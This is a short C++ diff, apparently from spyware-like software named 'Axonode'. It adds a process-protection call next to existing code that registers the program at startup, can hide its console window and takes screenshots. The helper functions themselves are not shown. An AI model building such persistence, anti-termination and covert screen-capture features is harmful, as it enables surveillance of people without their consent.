@@ -114,6 +114,11 @@ int main()
 	if (getStartup(L"Axonode") == FALSE)
 		addStartup();
   
+	if (ProtectProcess())
+		std::cout << "Process Protected.";
+	else
+		std::cout << "Process NOT Protected.";
+
 	//ShowWindow(FindWindowA("ConsoleWindowClass", NULL), false); //Hides the console window
 	getScreenShot();
 
@@ -128,4 +133,3 @@ int main()
 	}
     return 0;
 }
-
